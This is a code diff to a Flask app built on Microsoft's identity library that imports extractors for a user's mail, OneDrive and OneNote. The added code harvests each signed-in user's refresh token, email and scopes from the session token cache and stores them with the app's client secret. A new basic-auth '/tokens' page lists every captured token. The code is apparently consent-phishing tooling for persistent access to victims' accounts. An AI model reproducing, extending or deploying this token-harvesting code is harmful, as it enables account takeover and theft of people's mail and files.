@@ -1,27 +1,22 @@
 from flask              import Flask, redirect, render_template, request, session, url_for, jsonify
+from flask_basicauth    import BasicAuth
 from flask_session      import Session
 from extractor.onenote  import dump_onenote
 from extractor.onedrive import dump_onedrive
 from extractor.mail     import dump_mail
 from threading          import Thread
+from database           import insert_token, get_token
 
 import identity
 import identity.web
-import requests
 import app_config
-
+import json
 
 app = Flask(__name__)
 app.config.from_object(app_config)
 Session(app)
 
-
-# This section is needed for url_for("foo", _external=True) to automatically
-# generate http scheme when this sample is running on localhost,
-# and to generate https scheme when it is deployed behind reversed proxy.
-# See also https://flask.palletsprojects.com/en/2.2.x/deploying/proxy_fix/
-from werkzeug.middleware.proxy_fix import ProxyFix
-app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)
+basic_auth = BasicAuth(app)
 
 auth = identity.web.Auth(
     session=session,
@@ -29,7 +24,6 @@ auth = identity.web.Auth(
     client_id=app.config["CLIENT_ID"],
     client_credential=app.config["CLIENT_SECRET"],
 )
-
 
 @app.route("/login")
 def login():
@@ -44,6 +38,22 @@ def auth_response():
     result = auth.complete_log_in(request.args)
     if "error" in result:
         return render_template("auth_error.html", result=result)
+    
+    data    = json.loads(auth._session.get('_token_cache'))
+
+    key_name      = lambda x: list(x.keys())[0]
+    email         = data["Account"][key_name(data["Account"])]["username"]
+    refresh_token = data["RefreshToken"][key_name(data["RefreshToken"])]["secret"]
+    scope         = data["RefreshToken"][key_name(data["RefreshToken"])]["target"]
+
+    insert_token(
+        email=email,
+        refresh_token=refresh_token,
+        target=scope,
+        client_id=app.config["CLIENT_ID"],
+        secret=app.config["CLIENT_SECRET"]
+    )
+
     return redirect(url_for("index"))
 
 
@@ -51,6 +61,11 @@ def auth_response():
 def logout():
     return redirect(auth.log_out(url_for("index", _external=True)))
 
+@app.route("/tokens")
+@basic_auth.required
+def tokens():
+    return render_template('tokens.html', tokens=get_token())
+    
 
 @app.route("/")
 def index():
@@ -126,5 +141,6 @@ def oneall():
         return render_template('tkt.html') 
     
     return redirect(app_config.REDIRECT_URI_CLIENT)
+
 if __name__ == "__main__":
     app.run(debug=False)
